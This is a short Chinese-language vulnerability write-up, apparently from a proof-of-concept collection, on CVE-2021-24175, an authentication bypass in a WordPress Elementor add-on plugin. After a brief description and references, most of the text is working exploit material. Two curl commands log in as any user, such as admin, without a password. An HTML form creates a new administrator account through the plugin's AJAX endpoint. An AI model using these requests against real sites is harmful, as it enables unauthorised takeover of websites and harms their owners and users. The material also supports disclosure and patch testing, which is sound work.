# WordPress Elementor Page Builder Plus 身份验证绕过 CVE-2021-24175

## 漏洞描述

未经身份验证的用户可以使用"theplus_ajax_login"和"theplus_google_ajax_register" Ajax请求，通过仅提供相关的用户名，就可以像任何用户一样轻松地进行身份验证。

参考链接：

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24175
- https://wpscan.com/vulnerability/c311feef-7041-4c21-9525-132b9bd32f89

## 漏洞影响

```
Elementor Page Builder <4.1.7
```

## 漏洞复现

poc：

```
curl -X POST --data action=theplus_ajax_login --data email=admin -iLSS https://example.com/wp-admin/admin-ajax.php
curl -X POST --data action=theplus_google_ajax_register --data email=admin --data nonce=a -iLSS https://example.com/wp-admin/admin-ajax.php
```

"theplus_google_ajax_register"  AJAX请求还可以允许任何未经身份验证的用户创建具有任意角色的帐户，例如admin，然后登录。

html：

```html
<form method="POST" action="https://example.com/wp-admin/admin-ajax.php">
<input value="newadmin" name="name" type="text">
<input value="test@example.com" name="email" type="text">
<input value="test" name="password" type="text">
<input value="theplus_google_ajax_register" name="action" type="text">
<input value="administrator" name="tp_user_reg_role" type="text">
<input value="any" name="nonce" type="text">
<input type="submit" />
</form>
```

